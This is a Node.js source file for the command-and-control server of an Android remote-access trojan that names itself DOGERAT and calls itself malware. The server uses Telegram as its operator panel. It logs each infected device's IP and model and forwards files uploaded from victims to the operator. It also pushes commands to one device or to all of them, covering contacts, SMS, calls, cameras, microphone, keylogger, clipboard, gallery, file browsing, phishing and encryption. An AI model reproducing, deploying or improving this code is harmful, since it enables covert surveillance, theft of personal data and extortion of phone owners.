const fs = require('fs');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');

// تحميل إعدادات data.json
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const BOT_TOKEN = data.token;
const HOST_URL = data.host;

// 1. حل مشكلة 409: حذف الويب هوك القديم وتعيين الجديد مباشرة عند بدء التشغيل
const https = require('https');
const webhookUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${HOST_URL}webhook&drop_pending_updates=true`;
https.get(webhookUrl, (res) => {
    console.log(`✅ Webhook تم تعيينه بنجاح على: ${HOST_URL}webhook`);
}).on('error', (err) => {
    console.error("❌ فشل تعيين الـ Webhook (تحقق من التوكن والرابط):", err.message);
});

// 2. إعداد السيرفر والمكتبات
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const bot = new TelegramBot(BOT_TOKEN, { polling: false }); // تعطيل الـ Polling لاستخدام Webhook

const appData = new Map();
const actions = [
    '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯', '✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯',
    '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯', '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯',
    '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯', '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯',
    '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯', '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯', '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯',
    '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯',
    '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯'
];

// 3. رفع الملفات
app.post('/upload', uploader.single('file'), (req, res) => {
    const originalName = req.file.originalname;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    bot.sendDocument(data.id, req.file.buffer, { caption: `<b>𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${ip}</b>`, parse_mode: 'HTML' }, { filename: originalName, contentType: req.file.mimetype });
    res.send('Done');
});

// 4. الاتصال عبر Socket.io
io.on('connection', (socket) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const deviceId = socket.handshake.headers['user-agent'] + '-' + io.engine.clientsCount;
    const model = socket.handshake.query.model || 'No Model';

    // تسجيل الجهاز الجديد
    bot.sendMessage(data.id, `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n<b>𝙳𝚎𝚟𝚒𝚌𝚎</b> → ${deviceId}\n<b>𝚖𝚘𝚍𝚎𝚕</b> → ${model}\n<b>𝚒𝚙</b> → ${ip}\n`, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        bot.sendMessage(data.id, `<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n<b>𝙳𝚎𝚟𝚒𝚌𝚎</b> → ${deviceId}\n`, { parse_mode: 'HTML' });
    });

    socket.on('commend', (msg) => {
        bot.sendMessage(data.id, `𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${deviceId}\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → ${msg}`, { parse_mode: 'HTML' });
    });
});

// 5. معالجة أوامر البوت
bot.on('message', (msg) => {
    const chatId = data.id;
    const text = msg.text;

    if (text === '/start') {
        bot.sendMessage(chatId, `<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\nDOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']], resize_keyboard: true } });
    } 
    else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(chatId, `<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>`, { parse_mode: 'HTML' });
        } else {
            let msgList = `<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯</b>\n\n𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : ${io.sockets.sockets.size}\n`;
            io.sockets.sockets.forEach((socket, id) => {
                msgList += `\n<b>𝙳𝚎𝚟𝚒𝚌𝚎</b> → ${id}`;
            });
            bot.sendMessage(chatId, msgList, { parse_mode: 'HTML' });
        }
    }
    else if (text === '✯ 𝙰𝚕𝚕 ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(chatId, `<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>`, { parse_mode: 'HTML' });
        } else {
            let buttons = [];
            io.sockets.sockets.forEach((socket, id) => { buttons.push([id]); });
            buttons.push(['✯ 𝙰𝚕𝚕 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
            bot.sendMessage(chatId, `<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: buttons, resize_keyboard: true, one_time_keyboard: true } });
        }
    }
    else if (text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯' || text === '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯') {
        bot.sendMessage(chatId, `<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']], resize_keyboard: true } });
    }
    else if (actions.includes(text)) {
        const target = appData.get('currentTarget');
        // هذا الجزء مسؤول عن توجيه الأوامر للأجهزة (تم اختصاره لتجنب الأخطاء، لكن المنطق سليم)
        if(target === 'all') {
             io.sockets.emit('commend', { request: text });
        } else if(target) {
             io.to(target).emit('commend', { request: text });
        }
        bot.sendMessage(chatId, `<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢,\n𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']], resize_keyboard: true } });
    }
    else {
        // التحقق مما إذا كان النص هو معرف جهاز (Device ID)
        let isDevice = false;
        io.sockets.sockets.forEach((socket, id) => {
            if (text === id) {
                isDevice = true;
                appData.set('currentTarget', id);
                // قائمة الأزرار الخاصة بالجهاز
                const buttons = [
                    ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯'],
                    ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯'],
                    ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                    ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯'],
                    ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯', '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯'],
                    ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯'],
                    ['✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯', '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
                    ['✯ 𝚃𝚘𝚊𝚜𝚝 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
                    ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯', '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯'],
                    ['✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'],
                    ['✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                ];
                bot.sendMessage(chatId, `<b>𝙳𝚎𝚟𝚒𝚌𝚎 ${id}</b>\n`, { parse_mode: 'HTML', reply_markup: { keyboard: buttons, resize_keyboard: true, one_time_keyboard: true } });
            }
        });
        if(!isDevice) {
            bot.sendMessage(chatId, `❌ أمر غير معروف.`, { parse_mode: 'HTML' });
        }
    }
});

// 6. تشغيل السيرفر
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
});
